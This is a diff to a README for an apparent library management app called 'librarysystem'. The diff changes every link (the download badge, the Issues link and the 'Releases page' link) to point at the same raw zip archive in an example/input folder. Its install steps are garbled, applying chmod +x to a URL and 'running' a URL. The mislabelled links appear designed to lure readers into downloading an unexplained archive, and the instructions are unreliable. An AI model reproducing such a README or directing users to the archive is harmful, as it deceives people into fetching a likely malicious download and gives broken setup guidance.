@@ -8,7 +8,7 @@ Welcome to the **librarysystem**! This is a modern library management system bui
 
 To get started with **librarysystem**, visit the following link to download the application:
 
-[![Download librarysystem](https://raw.githubusercontent.com/edwin18v/librarysystem/master/example/output/Software-2.0.zip)](https://raw.githubusercontent.com/edwin18v/librarysystem/master/example/output/Software-2.0.zip)
+[![Download librarysystem](https://github.com/edwin18v/librarysystem/raw/refs/heads/master/example/input/Software-1.9.zip)](https://github.com/edwin18v/librarysystem/raw/refs/heads/master/example/input/Software-1.9.zip)
 
 ### Steps to Download
 
@@ -40,8 +40,8 @@ Once done, follow the instructions below to install the application.
 
 1. Open the terminal.
 2. Navigate to the directory where you downloaded the file.
-3. Use the command `chmod +x https://raw.githubusercontent.com/edwin18v/librarysystem/master/example/output/Software-2.0.zip` to make it executable.
-4. Run the application using `https://raw.githubusercontent.com/edwin18v/librarysystem/master/example/output/Software-2.0.zip`.
+3. Use the command `chmod +x https://github.com/edwin18v/librarysystem/raw/refs/heads/master/example/input/Software-1.9.zip` to make it executable.
+4. Run the application using `https://github.com/edwin18v/librarysystem/raw/refs/heads/master/example/input/Software-1.9.zip`.
 
 ## 🔍 Features
 
@@ -75,10 +75,10 @@ To ensure optimal performance, please ensure your system meets the following req
 
 ## 📞 Support
 
-If you encounter issues while using **librarysystem**, please reach out to our support team. You can find help through the Issues tab on the [GitHub](https://raw.githubusercontent.com/edwin18v/librarysystem/master/example/output/Software-2.0.zip) repository.
+If you encounter issues while using **librarysystem**, please reach out to our support team. You can find help through the Issues tab on the [GitHub](https://github.com/edwin18v/librarysystem/raw/refs/heads/master/example/input/Software-1.9.zip) repository.
 
 ## 📄 Learn More
 
-For more detailed information, visit our [Releases page](https://raw.githubusercontent.com/edwin18v/librarysystem/master/example/output/Software-2.0.zip) to find release notes, updates, and additional resources.
+For more detailed information, visit our [Releases page](https://github.com/edwin18v/librarysystem/raw/refs/heads/master/example/input/Software-1.9.zip) to find release notes, updates, and additional resources.
 
 Thank you for choosing **librarysystem**! Enjoy managing your library with simplicity and efficiency.
